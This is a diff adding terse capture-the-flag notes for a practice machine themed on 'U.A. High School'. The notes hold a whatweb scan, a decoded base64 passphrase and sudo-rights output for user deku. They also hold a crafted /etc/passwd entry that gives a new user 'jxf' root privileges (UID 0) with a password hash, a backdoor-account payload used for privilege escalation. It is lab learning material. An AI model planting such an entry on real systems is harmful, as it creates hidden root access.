@@ -1,0 +1,19 @@
+whatweb http://10.10.225.198
+http://10.10.225.198 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[info@yuei.ac.jp], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.225.198], Title[U.A. High School]  
+
+
+passphrase.txt = QWxsbWlnaHRGb3JFdmVyISEhCg==
+decoded string =  AllmightForEver!!!
+
+#Privilege Escalation
+
+Matching Defaults entries for deku on myheroacademia:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User deku may run the following commands on myheroacademia:
+    (ALL) /opt/NewComponent/feedback.sh
+deku@myheroacademia:/home$ 
+
+
+jxf:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:jxf:/root:/bin/bash
+
